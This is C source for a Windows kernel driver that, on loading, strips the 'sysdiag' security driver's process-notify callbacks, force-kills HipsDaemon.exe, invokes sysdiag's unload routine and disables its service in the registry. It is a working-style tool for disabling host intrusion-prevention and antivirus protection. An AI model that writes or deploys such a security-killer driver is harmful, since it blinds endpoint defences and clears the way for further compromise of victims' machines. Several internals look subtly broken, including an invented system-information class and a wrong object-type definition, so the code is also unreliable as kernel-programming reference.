#include <ntddk.h>
#include <ntimage.h>

typedef struct _EPROCESS EPROCESS;
typedef enum _SYSTEM_INFORMATION_CLASS SYSTEM_INFORMATION_CLASS;

typedef VOID (*PPROCESS_NOTIFY_ROUTINE)(
    _In_ HANDLE ParentId,
    _In_ HANDLE ProcessId,
    _In_ BOOLEAN Create
);

typedef NTSTATUS(NTAPI* PPSREMOVEPROCESSNOTIFYROUTINE)(
    _In_ PPROCESS_NOTIFY_ROUTINE NotifyRoutine
);

typedef NTSTATUS(NTAPI* PNTQUERYSYSTEMINFORMATION)(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);

#define SystemProcessNotifyInformation (SYSTEM_INFORMATION_CLASS)63
typedef struct _PROCESS_NOTIFY_ENTRY
{
    PPROCESS_NOTIFY_ROUTINE NotifyRoutine;
} PROCESS_NOTIFY_ENTRY, *PPROCESS_NOTIFY_ENTRY;

#define IoDriverObjectType 4

NTKERNELAPI PLIST_ENTRY PsGetProcessList(VOID);
NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);
NTKERNELAPI NTSTATUS PsTerminateProcess(PEPROCESS Process, NTSTATUS ExitStatus);
NTKERNELAPI HANDLE PsGetProcessId(PEPROCESS Process);
NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process);

PPSREMOVEPROCESSNOTIFYROUTINE g_pPsRemoveProcessNotifyRoutine = NULL;
PNTQUERYSYSTEMINFORMATION g_pNtQuerySystemInformation = NULL;

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("MiniDrv: Unload\r\n");
}

NTSTATUS RemoveSysdiagProcessNotifyCallbacks()
{
    NTSTATUS status;
    ULONG returnLen = 0;
    PVOID pBuffer = NULL;
    UNICODE_STRING routineName;
    PPROCESS_NOTIFY_ENTRY pNotifyEntry;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PVOID modBase;
    SIZE_T modSize;

    RtlInitUnicodeString(&routineName, L"PsRemoveProcessNotifyRoutine");
    g_pPsRemoveProcessNotifyRoutine = (PPSREMOVEPROCESSNOTIFYROUTINE)MmGetSystemRoutineAddress(&routineName);
    if (g_pPsRemoveProcessNotifyRoutine == NULL)
    {
        DbgPrint("MiniDrv: PsRemoveProcessNotifyRoutine not found\r\n");
        return STATUS_NOT_FOUND;
    }

    RtlInitUnicodeString(&routineName, L"NtQuerySystemInformation");
    g_pNtQuerySystemInformation = (PNTQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&routineName);
    if (g_pNtQuerySystemInformation == NULL)
    {
        DbgPrint("MiniDrv: NtQuerySystemInformation not found\r\n");
        return STATUS_NOT_FOUND;
    }

    status = g_pNtQuerySystemInformation(
        SystemProcessNotifyInformation,
        NULL,
        0,
        &returnLen
    );
    if (status != STATUS_INFO_LENGTH_MISMATCH || returnLen == 0)
    {
        DbgPrint("MiniDrv: Query notify info get size failed, status=%08X\r\n", status);
        return status;
    }

    pBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, returnLen, 'mdrv');
    if (pBuffer == NULL)
    {
        DbgPrint("MiniDrv: Allocate pool failed\r\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    status = g_pNtQuerySystemInformation(
        SystemProcessNotifyInformation,
        pBuffer,
        returnLen,
        &returnLen
    );
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: Query notify info failed %08X\r\n", status);
        ExFreePool(pBuffer);
        return status;
    }

    pNotifyEntry = (PPROCESS_NOTIFY_ENTRY)pBuffer;
    for (; pNotifyEntry->NotifyRoutine != NULL; pNotifyEntry++)
    {
        pDos = (PIMAGE_DOS_HEADER)pNotifyEntry->NotifyRoutine;
        if (pDos->e_magic == IMAGE_DOS_SIGNATURE)
        {
            modBase = pNotifyEntry->NotifyRoutine;
        }
        else
        {
            modBase = NULL;
        }
        if (modBase == NULL)
        {
            continue;
        }
        pNt = (PIMAGE_NT_HEADERS)((PUCHAR)modBase + pDos->e_lfanew);
        modSize = pNt->OptionalHeader.SizeOfImage;
        if ((PUCHAR)pNotifyEntry->NotifyRoutine >= (PUCHAR)modBase && (PUCHAR)pNotifyEntry->NotifyRoutine < ((PUCHAR)modBase + modSize))
        {
            DbgPrint("MiniDrv: Found sysdiag notify routine %p, removing...\r\n", pNotifyEntry->NotifyRoutine);
            status = g_pPsRemoveProcessNotifyRoutine(pNotifyEntry->NotifyRoutine);
            if (NT_SUCCESS(status))
            {
                DbgPrint("MiniDrv: Remove callback OK\r\n");
            }
            else
            {
                DbgPrint("MiniDrv: Remove callback FAILED status=%08X\r\n", status);
            }
        }
    }

    ExFreePool(pBuffer);
    return STATUS_SUCCESS;
}

NTSTATUS ForceKillProcessByPid(HANDLE pid)
{
    NTSTATUS status;
    PEPROCESS pEprocess = NULL;
    status = PsLookupProcessByProcessId(pid, &pEprocess);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: PsLookupProcessByProcessId failed, PID=%lu, status=%08X\r\n",
            HandleToUlong(pid), status);
        return status;
    }
    DbgPrint("MiniDrv: Call PsTerminateProcess PID=%lu\r\n", HandleToUlong(pid));
    status = PsTerminateProcess(pEprocess, STATUS_SUCCESS);
    DbgPrint("MiniDrv: PsTerminateProcess done, status=%08X\r\n", status);
    ObDereferenceObject(pEprocess);
    return status;
}

VOID EnumAndKillHipsDaemon()
{
    PLIST_ENTRY pListHead = NULL;
    PLIST_ENTRY pCurEntry = NULL;
    PEPROCESS pEproc = NULL;
    HANDLE pid = NULL;
    UCHAR imageName[16] = { 0 };

    pListHead = PsGetProcessList();
    if (pListHead == NULL)
    {
        DbgPrint("MiniDrv: PsGetProcessList returned NULL\r\n");
        return;
    }
    pCurEntry = pListHead->Flink;
    while (pCurEntry != NULL && pCurEntry != pListHead)
    {
        pEproc = (PEPROCESS)((PUCHAR)pCurEntry - FIELD_OFFSET(EPROCESS, ActiveProcessLinks));
        pCurEntry = pCurEntry->Flink;
        pid = PsGetProcessId(pEproc);
        UCHAR* pImgName = PsGetProcessImageFileName(pEproc);
        if (pImgName != NULL)
        {
            RtlZeroMemory(imageName, sizeof(imageName));
            RtlStringCbCopyA(imageName, sizeof(imageName), (PCSTR)pImgName);
            if (_stricmp((PCSTR)imageName, "HipsDaemon.exe") == 0)
            {
                DbgPrint("MiniDrv: Found HipsDaemon.exe, PID=%lu\r\n", HandleToUlong(pid));
                ForceKillProcessByPid(pid);
            }
        }
    }
}

NTSTATUS DisableSysdiagService()
{
    NTSTATUS status = STATUS_SUCCESS;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    UNICODE_STRING keyPath = { 0 };
    UNICODE_STRING valueName = { 0 };
    HANDLE hKey = NULL;
    ULONG startValue = 4;

    RtlInitUnicodeString(&keyPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\sysdiag");
    InitializeObjectAttributes(&objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenKey(&hKey, KEY_WRITE, &objAttr);
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: ZwOpenKey sysdiag failed, status=%08X\r\n", status);
        return status;
    }
    RtlInitUnicodeString(&valueName, L"Start");
    status = ZwSetValueKey(hKey, &valueName, 0, REG_DWORD, &startValue, sizeof(ULONG));
    if (NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: Set sysdiag Start=4 SUCCESS\r\n");
    }
    else
    {
        DbgPrint("MiniDrv: ZwSetValueKey Start failed, status=%08X\r\n", status);
    }
    ZwClose(hKey);
    return status;
}

NTSTATUS TryUnloadSysdiagDriver()
{
    NTSTATUS status;
    UNICODE_STRING drvName;
    PDRIVER_OBJECT pDrvObj = NULL;
    RtlInitUnicodeString(&drvName, L"sysdiag");
    status = ObReferenceObjectByName(
        &drvName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        0,
        IoDriverObjectType,
        NULL,
        NULL,
        (PVOID*)&pDrvObj
    );
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: ObReferenceObjectByName sysdiag failed %08X\r\n", status);
        return status;
    }
    if (pDrvObj->DriverUnload != NULL)
    {
        DbgPrint("MiniDrv: Calling sysdiag DriverUnload\r\n");
        pDrvObj->DriverUnload(pDrvObj);
    }
    ObDereferenceObject(pDrvObj);
    DbgPrint("MiniDrv: Sysdiag driver unload attempt finished\r\n");
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status = STATUS_SUCCESS;
    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("==== MiniDrv Loaded Win10 19045.7184 ====\r\n");

    status = RemoveSysdiagProcessNotifyCallbacks();
    if (!NT_SUCCESS(status))
    {
        DbgPrint("MiniDrv: Remove callback warning %08X\r\n", status);
    }
    EnumAndKillHipsDaemon();
    TryUnloadSysdiagDriver();
    DisableSysdiagService();

    DbgPrint("==== MiniDrv All Task Finished ====\r\n");
    return status;
}
